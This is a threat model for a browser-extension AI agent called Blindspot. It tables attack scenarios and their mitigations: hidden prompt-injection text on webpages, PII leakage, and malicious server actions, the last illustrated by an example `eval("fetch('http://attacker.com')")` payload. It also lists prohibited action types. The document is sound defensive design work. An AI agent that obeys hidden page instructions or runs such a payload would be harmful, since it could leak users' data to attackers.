# Threat Model — SIH26171 (Blindspot)

## Threat Analysis & Risk Matrix

| Threat Vector | Attack Scenario | Impact | Defense & Mitigation |
| :--- | :--- | :---: | :--- |
| **1. Malicious Webpage Content** | Attacker webpage embeds hidden prompt injection instructions in invisible text. | High | Local Perception extracts text but strips hidden/invisible DOM elements (`display: none`). Action schema restricts execution primitives. |
| **2. Accidental PII Transmission** | User opens page with sensitive fields (login, banking) while agent is active. | Critical | Privacy Firewall intercepts DOM extraction, redacting passwords, emails, financial IDs to synthetic tokens before network transmission. |
| **3. Malicious Server Action** | Server response generates arbitrary JavaScript payload e.g. `eval("fetch('http://attacker.com')")`. | Critical | Action Validator strictly rejects actions like `execute_code`, `eval`, or un-whitelisted primitives. |
| **4. Invalid Action Payload** | Server returns malformed JSON or targets non-existent element IDs. | Low | Action Executor validates schema, verifies element mapping existence in local `ElementMapper`, and fails safely without breaking browser tab. |
| **5. Compromised Network / MITM** | Network attacker intercepts traffic between extension and agent server. | Medium | API request contains ONLY sanitized PSSR data; no actual passwords, credit cards, or PII exist in the payload to compromise. |

---

## Action Execution Guardrails

The Action Executor enforces strict bounds:
- Allowed action types: `click`, `type`, `scroll`, `select`, `navigate`, `focus`, `back`, `wait`.
- Prohibited action types: `execute_code`, `eval`, `script`, `fetch`, `chrome_api_call`.
- Every action must target a validated local element ID (`e1`, `e2`, ...) mapped in content script memory.
